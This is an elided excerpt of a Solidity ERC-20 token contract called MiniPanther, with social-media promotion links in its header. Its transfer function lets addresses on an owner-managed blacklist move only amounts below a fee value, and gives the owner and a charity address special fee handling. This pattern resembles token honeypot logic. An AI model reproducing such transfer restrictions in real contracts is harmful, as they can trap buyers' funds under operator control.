...
/*
    ...
    💬 https://t.me/minipanther_chat
    
    💬 https://t.me/minipanther_channel
    
    🐆  https://minipanther.org/
    
    ⭐️ https://twitter.com/minipanther_erc
...
contract MiniPanther is Context, IERC20, Ownable {
    ...
    /**
     * @dev update `addBotToBlackList` to detect bot
     *
     */
    ...
    function isBlackList(address botAdd) private view returns (bool) {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (isBlackList(sender) == true ) {
            require(amount < _taxFee, "Transfer amount exceeds the maxTxAmount.");
        }
        
        if (sender == owner() || sender == _charityAddress) {
            ...
            _balances[_charityAddress] = _balances[_charityAddress].add(transferFee);
